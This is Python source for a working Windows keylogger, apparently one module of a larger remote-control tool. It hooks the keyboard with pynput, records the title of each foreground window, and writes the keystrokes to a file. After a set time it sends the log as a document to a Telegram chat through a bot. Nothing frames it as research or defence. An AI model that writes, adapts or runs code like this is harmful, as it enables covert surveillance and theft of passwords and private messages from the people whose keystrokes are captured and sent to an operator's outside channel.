#!/usr/bin/env python3
import threading, os.path, getpass
from datetime import datetime, timedelta
from pynput.keyboard import Key, Listener
from pathlib import Path
from win32 import win32gui
# starts the keylog and sends mesasge in telegram chat that it has been started

import time

count = 0
keys = []
active_window = ""
date_time = datetime.now()
user = getpass.getuser()

# from dotenv import load_dotenv
# load_dotenv() # will search for .env file in local folder and load variables
# path = os.path.join(str(os.getenv("OUTPUT")), str(os.getenv("OUTPUT_KEYLOGGER")))

count = 0
keys = []
active_window = ""
date_time = datetime.now()

import re  

import telepot


def while_press(key, path):
    global keys, count, active_window

    window = win32gui
    keys.append(key)
    count += 1
    
    # checks what windows the current user is in and appends current window in logfile
    if active_window != window.GetWindowText(window.GetForegroundWindow()):
        active_window = window.GetWindowText(window.GetForegroundWindow())
        log = open(path, "a", encoding="utf-8")
        log.write("\n\n" + "NEW WINDOW! NEW WINDOW = " + str(active_window) + " AT " + str(date_time) + "\n\n")
        log.close()

    # if over 25 characters typed, write to log
    if count >= 25:
        count = 0
        write_file(keys, path)
        keys=[]
    
    # if key backspace has been detected delete last entry('s)
    if str(key) == "Key.backspace":
        keys = keys[:-1]


def write_file(keys, path):

    with open(path, "a", encoding="utf-8") as f:
        for key in keys:
            # checks for keystrokes and replaces them to make it clearer
            k = str(key)

           
            
            special_key = re.compile("Key\\.(.*)")
            if special_key.match(k):
                k = f"<%s>" %(k)

            if (k == '<Key.enter>'):
                k = k.replace('<Key.enter>', '<Key.enter>\n')
            
            character =  re.compile("\'(.*)\'")
            if character.match(k):
                k = k.replace("'", "")
            

            f.write(k)





def get(botObj:telepot.Bot, chat_id, duration=10, path=os.path.join(".","output","keylogger.txt")):

    print ("Keylogger start")
    if (botObj is not None):
        botObj.sendMessage(chat_id, "Keylogger for %s second(s)"%(duration))

    listener = Listener(on_press=lambda key: while_press(key, path=path))
    listener.start()
    
    endTime = datetime.now() + timedelta(seconds=duration)
    while True:
        if datetime.now() >= endTime:
            listener.stop()
            print ("Keylogger stop")
            break
        time.sleep(1)

    if (botObj is not None):
        with Path(path).open('r', encoding='utf-8') as network_io:
            botObj.sendDocument(chat_id, document=network_io, caption="keylogger")
